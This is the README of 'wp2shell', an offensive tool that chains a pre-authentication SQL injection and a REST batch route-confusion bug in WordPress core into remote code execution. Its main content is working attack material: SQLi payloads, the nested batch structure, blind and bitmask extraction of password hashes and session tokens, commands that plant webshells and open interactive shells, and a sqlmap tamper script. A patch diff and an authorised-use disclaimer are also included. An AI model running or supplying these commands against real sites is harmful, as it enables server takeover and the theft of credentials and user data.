# wp2shell

**Pre-authentication SQL injection → Remote Code Execution in WordPress Core**

| | |
|---|---|
| **CVE** | `CVE-2026-63030` (batch route confusion → RCE) + `CVE-2026-60137` (WP_Query SQLi) |
| **GHSA** | [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) · [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) |
| **Discoverer** | Adam Kues — Assetnote / Searchlight Cyber |
| **Affected** | WordPress **6.9.0–6.9.4**, **7.0.0–7.0.1** (full RCE chain) · **6.8.0–6.8.5** (SQLi only, facilitated path) |
| **Patched** | **6.8.6**, **6.9.5**, **7.0.2** |
| **CVSS** | 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Python** | 3.8+ (stdlib only, zero dependencies) |

---

## Overview

Two bugs in WordPress core chain into **unauthenticated remote code execution** on
a stock install — no plugins, no authentication, no configuration required.

1. **CVE-2026-60137** — SQL injection in `WP_Query::author__not_in`.
   When the parameter is a string, the `is_array()` sanitisation guard is skipped
   and the raw value is interpolated into a `NOT IN (...)` clause.

2. **CVE-2026-63030** — Batch route confusion in `WP_REST_Server::serve_batch_request_v1()`.
   A `WP_Error` sub-request (malformed path) is pushed into `$validation[]` but not
   `$matches[]`, causing a +1 index shift. Each subsequent sub-request is dispatched
   with the **wrong** handler.

Neither bug alone is enough: the REST API sanitises `author_exclude` (schema: `array[int]`)
before it reaches `WP_Query`, and the batch endpoint rejects `GET` sub-requests
(allowlist: `POST, PUT, PATCH, DELETE`). Chaining them through a **double confusion**
bypasses both defences and reaches the SQLi unauthenticated.

### The double-confusion chain

```
┌──────────────────────────────────────────────────────────────────┐
│  OUTER batch  (POST /wp-json/batch/v1)                          │
│                                                                 │
│  [0]  path = "///"             → WP_Error, NOT in $matches      │
│  [1]  path = "/wp/v2/posts"    → carries inner batch in body    │
│       Validated as a posts request → "requests" field untouched │
│  [2]  path = "/batch/v1"       → batch handler → shifts to [1]  │
│                                                                 │
│  Outer shift: request[1] dispatched with request[2]'s handler = │
│  serve_batch_request_v1.  The batch endpoint has NO             │
│  permission_callback → fires unauthenticated.  request[1]'s     │
│  body was validated against the *posts* route, so the nested    │
│  sub-requests were NEVER checked against the batch method enum  │
│  → GET is now allowed.                                          │
├──────────────────────────────────────────────────────────────────┤
│  INNER batch  (processed inside serve_batch_request_v1)         │
│                                                                 │
│  [0]  path = "///"             → WP_Error, NOT in $matches      │
│  [1]  GET /wp/v2/users         │
│         ?author_exclude=<SQLI>  │                                │
│       Validated against users → author_exclude NOT sanitised    │
│  [2]  GET /wp/v2/posts         → get_items handler → shift      │
│                                                                 │
│  Inner shift: inner[1] dispatched with inner[2]'s handler =    │
│  WP_REST_Posts_Controller::get_items.  unsanitised string       │
│  author_exclude → author__not_in → WP_Query → SQL INJECTION     │
└──────────────────────────────────────────────────────────────────┘
```

The resulting SQL fragment:

```sql
AND wp_posts.post_author NOT IN ( 1) OR SLEEP(N)-- - )
```

`SLEEP(N)` fires once per matching post row; total delay ≈ `N × post_count` seconds.

### From SQLi to RCE

Two post-exploitation paths to code execution:

| Path | Pre-auth? | Requirements |
|------|-----------|-------------|
| **INTO OUTFILE** | Yes | MySQL `FILE` privilege + web-writable directory (common on shared hosting / self-managed LAMP) |
| **Plugin upload** | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell plugin |

The SELECT-only injection writes a token-gated PHP webshell via `UNION SELECT INTO OUTFILE`
when `FILE` privilege is available. Without it, the administrator password hash is recovered
via blind extraction, cracked offline, and used to deploy a plugin webshell through the
authenticated admin UI.

> **Note:** The original discoverer (Assetnote) described a pre-auth RCE chain that does
> NOT require FILE privilege. The patch diff adds `is_dispatching()` guards in two locations
> (`rest_api_loaded()` and `serve_request()`), suggesting the full chain involved recursive
> REST dispatch combined with SQLi state manipulation. This path has not been publicly
> disclosed. Our `probe` command maps admin endpoint reachability via route confusion to
> assist in researching the remaining gap.

---

## Quick Start

```bash
# Detection only (non-destructive, no SQLi sent)
python3 wp2shell.py check http://target/

# Detection + active SQLi timing confirmation
python3 wp2shell.py check http://target/ --confirm-sqli

# Use ?rest_route= for sites without pretty permalinks
python3 wp2shell.py check http://target/ --rest-route

# Extract database info (fast mode — X-WP-Total bitmask oracle)
python3 wp2shell.py extract http://target/ --preset fingerprint --fast

# Extract user password hashes (fast mode, ~6 requests)
python3 wp2shell.py extract http://target/ --preset users --fast

# Custom SQL query via blind extraction
python3 wp2shell.py extract http://target/ --query "SELECT user_email FROM wp_users WHERE ID=1"

# RCE via INTO OUTFILE (needs FILE privilege)
python3 wp2shell.py rce http://target/ --outfile --cmd "id"

# RCE via plugin upload (needs admin credentials from cracked hash)
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id"

# Map admin endpoint reachability via route confusion
python3 wp2shell.py probe http://target/
python3 wp2shell.py probe http://target/ --confirm-sqli   # also extract DB secrets

# Proxy through Burp
python3 wp2shell.py check http://target/ --proxy http://127.0.0.1:8080
```

---

## Commands

### `check` — Non-destructive vulnerability detection

Three-phase detection, progressively more invasive:

| Phase | What | Safe? |
|-------|------|-------|
| **1. Version detection** | Checks REST API root, homepage meta tags, RSS feed, readme.html | Yes |
| **2. Marker probe** | Sends a benign batch that produces a specific 3-code error pattern (`parse_path_failed` + `block_cannot_read` + `rest_batch_not_allowed`) only when the `$matches`/`$validation` desync is present | Yes — no SQL |
| **3. Timing confirmation** (`--confirm-sqli`) | Paired baseline/delayed `SLEEP(N)` samples with median comparison | Reads no data, changes nothing |

```bash
python3 wp2shell.py check http://target/
python3 wp2shell.py check http://target/ --confirm-sqli --sleep 3 --samples 5
python3 wp2shell.py check http://target/ --rest-route -v
```

Example output (vulnerable 6.9.4):

```
[*] detecting WordPress version...
[!] Version: 6.9.4 — VULNERABLE (RCE (batch confusion + SQLi))
[*] probing batch endpoint...
[*] sending marker probe (non-destructive)...
[+] route-confusion desync DETECTED (codes: block_cannot_read, parse_path_failed, rest_batch_not_allowed)
[*] SQL timing confirmation (sleep=2.0s, samples=3)...
[*]   sample 1: baseline=0.04s, delayed=2.04s
[*]   sample 2: baseline=0.03s, delayed=2.04s
[*]   sample 3: baseline=0.03s, delayed=2.03s
[*] median delta 2.01s, threshold 1.20s
[+] SQLi CONFIRMED — baseline 0.03s, injected 2.04s
```

### `extract` — Read database via blind SQLi

Two extraction modes:

| Mode | Oracle | Requests per char | Use when |
|------|--------|-------------------|----------|
| **Blind** (default) | Boolean AND — rows returned only when condition holds | ~7 (binary search) | Stable, works everywhere |
| **Fast** (`--fast`) | X-WP-Total bitmask — conditional UNION SELECT adds 0 or 1 rows; X-WP-Total header reflects this | ~0.06 (112 probes per 16 chars in 1 request) | Speed matters, large extractions |

```bash
# Fingerprint (version, user, database)
python3 wp2shell.py extract http://target/ --preset fingerprint --fast

# User password hashes
python3 wp2shell.py extract http://target/ --preset users --fast

# Custom SQL expression (blind mode)
python3 wp2shell.py extract http://target/ --query "SELECT option_value FROM wp_options WHERE option_name='siteurl'"

# With custom table prefix and max length
python3 wp2shell.py extract http://target/ --preset users --prefix wp_abc_ --max-length 256
```

### `rce` — Remote code execution

Two RCE paths, one command:

```bash
# Path A: INTO OUTFILE (pre-auth, needs FILE privilege)
python3 wp2shell.py rce http://target/ --outfile --cmd "uname -a; id"
python3 wp2shell.py rce http://target/ --outfile --cmd "cat /etc/passwd"
python3 wp2shell.py rce http://target/ --outfile -i    # interactive shell

# Path B: plugin upload (post-auth, needs admin credentials)
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id"
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' -i
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id" --cleanup
```

Both paths deploy **token-locked webshells** — random paths, random tokens, `hash_equals()` token verification. The `--cleanup` flag removes the webshell plugin when finished.

Customise INTO OUTFILE paths:

```bash
python3 wp2shell.py rce http://target/ --outfile \
  --outfile-dir /var/www/html \
  --web-dir / \
  --cmd "id"
```

### `probe` — Admin endpoint mapping + secret extraction

Maps which admin-gated REST endpoints respond via route-shifted dispatch, and optionally
extracts escalation-relevant database secrets via blind SQLi.

```bash
# Map admin endpoints only
python3 wp2shell.py probe http://target/

# Map + extract DB secrets
python3 wp2shell.py probe http://target/ --confirm-sqli
```

Probes 14 auth-gated endpoints (users, settings, plugins, themes, templates, etc.)
and extracts: admin session tokens, user activation keys, application passwords,
REST API nonce keys, and recent transients.

---

## Affected Versions

| Version range | CVE-2026-60137 (SQLi) | CVE-2026-63030 (route confusion) | RCE chain | Exploitable via this tool |
|---------------|----------------------|----------------------------------|-----------|--------------------------|
| ≤ 6.7.x | ❌ | ❌ | ❌ | ❌ |
| 6.8.0 – 6.8.5 | ✅ (facilitated) | ❌ | ❌ | ❌ (SQLi requires plugin/theme path) |
| 6.8.6 | ❌ (patched) | ❌ | ❌ | ❌ |
| 6.9.0 – 6.9.4 | ✅ | ✅ | ✅ | ✅ |
| 6.9.5 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |
| 7.0.0 – 7.0.1 | ✅ | ✅ | ✅ | ✅ |
| 7.0.2 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |

**6.8.x note:** The SQLi in `WP_Query::author__not_in` exists on 6.8.x but the batch route
confusion bug was **introduced in 6.9.0** when the batch handler was refactored. On 6.8.x,
the `$matches[]` array is always appended (no off-by-one), and the batch method allowlist
correctly blocks `GET` requests. The SQLi can only be reached on 6.8.x through a
"facilitated" path — a plugin or theme passing raw user input to `WP_Query`. The discoverers
(TF1T, dtro, haongo) independently reported this SQLi before Assetnote chained it with the
route confusion for RCE.

---

## How It Works

### Detection: Marker Probe

A crafted batch request that produces a specific 3-code error pattern **only** when the
`$matches`/`$validation` desync is present:

```
[primer, POST /wp/v2/posts, POST /wp/v2/block-renderer/core/archives, POST /batch/v1]
```

| Code | Origin | Why it appears on vulnerable builds |
|------|--------|-------------------------------------|
| `parse_path_failed` | `///` primer | Malformed path always produces this |
| `block_cannot_read` | `/wp/v2/block-renderer/core/archives` | Posts request is shifted onto the block-renderer handler, which is not batch-allowed |
| `rest_batch_not_allowed` | `/batch/v1` | Block-renderer request is shifted onto the batch handler (self-call disallowed) |

All three codes appear together **only** when the arrays are misaligned. On patched builds,
the arrays stay aligned and at most `parse_path_failed` appears.

### SQLi: Paired Timing Confirmation

Alternates baseline (`SLEEP(0)`) and delayed (`SLEEP(N)`) injections, taking the **median**
of paired deltas. This is robust against network jitter where a single measurement might
produce false positives or negatives. The injected value:

```
0) SELECT IF(1=1, SLEEP(N), 0)-- -
```

lands inside the query as:

```sql
AND wp_posts.post_author NOT IN ( 0) SELECT IF(1=1, SLEEP(N), 0)-- - )
```

### Extraction: Boolean Oracle

```sql
0) AND (<condition>)-- -
```

When the condition is true, `get_items()` returns rows. When false, no rows. This is a
**sleep-free** oracle — character-by-character binary search extracts data without timing
side-channels.

### Extraction: X-WP-Total Fast Mode

Two independent properties combine into a high-speed extraction technique:

1. **X-WP-Total reflects `SQL_CALC_FOUND_ROWS`** — it counts UNION rows at the SQL level
   even though PHP's `get_post()` filters them from the response body. A conditional
   `UNION SELECT` that adds 0 or 1 rows makes `X-WP-Total` a **per-bit oracle**.

2. **The inner batch has no item count limit** — the `maxItems: 25` constraint was on the
   outer batch endpoint, which is bypassed by the route confusion. The recursive
   `serve_batch_request_v1()` call iterates with no size check.

Combined: pack 7 bit-probes × 16 characters into **one** HTTP request. Each probe's
`X-WP-Total` (0 or 1) tells us whether that bit is set. An entire 34-character password
hash can be read in 2–3 requests instead of ~224.

### RCE: Token-Locked Webshells

Both RCE paths deploy webshells locked behind:

- **Random path** (`/wp-content/plugins/wp2shell_<hex>/wp2shell_<hex>.php` or `/rce/s_<hex>.php`)
- **Random 16-byte token** (verified server-side with `hash_equals()`)
- **Per-session uniqueness** — no two runs produce the same path or token

The `--cleanup` flag deletes the plugin directory after execution. Without it, the tool
prints the removal command.

---

## Patch Diff (6.9.4 → 6.9.5)

Three changes across five files:

| File | Change | What it fixes |
|------|--------|---------------|
| `class-wp-query.php` | `wp_parse_id_list()` replaces `is_array()` + `(array)` cast | CVE-2026-60137 (SQLi) |
| `class-wp-rest-server.php` (line ~1755) | `$matches[] = $single_request;` added for WP_Error items | CVE-2026-63030 (route confusion off-by-one) |
| `class-wp-rest-server.php` (line ~286) | `is_dispatching()` guard in `serve_request()` | Prevents recursive REST dispatch (RCE hardening) |
| `rest-api.php` (line ~441) | `is_dispatching()` guard in `rest_api_loaded()` | Prevents recursive REST dispatch from starting a new cycle |
| `version.php` | Bump to 6.9.5 | — |

The `is_dispatching()` guards in **two separate files** suggest the undisclosed pre-auth
RCE chain relied on recursive REST dispatch combined with SQLi-manipulated state.

---

## `wp2shell_tamper.py` — sqlmap Integration

Drop-in sqlmap tamper script that wraps payloads in the double-confusion batch
structure. Also works standalone for time-based blind extraction with nonce
recovery for admin endpoint calls.

```bash
# Standalone: extract DB info
python3 wp2shell_tamper.py --target http://target/ --query "SELECT @@version"

# Extract nonces and attempt admin endpoint call
python3 wp2shell_tamper.py --target http://target/ --extract-nonce \
  --admin-endpoint /wp/v2/users/me

# With sqlmap (time-based blind):
sqlmap -u "http://target/wp-json/batch/v1" \
  --data='{"placeholder":"INJECT"}' \
  --tamper=wp2shell_tamper \
  --technique=T --time-sec=3 \
  --prefix="0)" --suffix="-- -" \
  --dbms=mysql -p placeholder \
  --eval="import wp2shell_tamper; wp2shell_tamper.init_target('http://target/')"
```

---

## Test Results

Verified against 7 WordPress versions, 47 unit tests, 0 external dependencies:

| Version | Desync detected | SQLi confirmed | RCE path |
|---------|----------------|----------------|----------|
| 6.8.5 | ❌ (batch handler lacks off-by-one) | ❌ (GET blocked by allowlist) | N/A |
| 6.8.6 | ❌ | ❌ | ❌ |
| **6.9.4** | **✅** | **✅ δ=2.01s** | **✅ plugin RCE** |
| 6.9.5 | ❌ | ❌ | ❌ |
| **7.0.0** | **✅** | **✅ δ=2.00s** | **✅** |
| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅** |
| 7.0.2 | ❌ | ❌ | ❌ |

All results match the CVE advisory. Unit tests cover: payload structure, response parsing,
marker probe error codes, blind extraction oracle, fast extraction (X-WP-Total), timing
confirmation, version detection, SQL escaping, plugin ZIP generation, and colour output.

```bash
python3 -m pytest test_wp2shell.py -v
# 47 passed in 0.12s
```

---

## References

- [WordPress 7.0.2 Release Announcement](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
- [Searchlight Cyber wp2shell Advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/)
- [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) — CVE-2026-63030
- [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) — CVE-2026-60137
- [Patch diff 6.9.4 → 6.9.5](https://github.com/WordPress/wordpress-develop/compare/6.9.4...6.9.5)
- [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) — Marker probe technique + AdminSession
- [47Cid/wp2shell-lab](https://github.com/47Cid/wp2shell-lab) — FastExtractor (X-WP-Total) + Docker lab + INTO OUTFILE

---

## License

GPL-3.0 — see [LICENSE](LICENSE).

## Legal

For **authorised security testing only**. Use exclusively against systems you own or have
explicit written permission to test.

This tool performs **detection** by default (marker probe, non-destructive). The `--confirm-sqli`
flag enables active timing-based SQL injection confirmation. The `extract` command performs
blind data extraction. The `rce` command deploys webshells — use `--cleanup` to remove them.

No warranty. No liability for misuse.
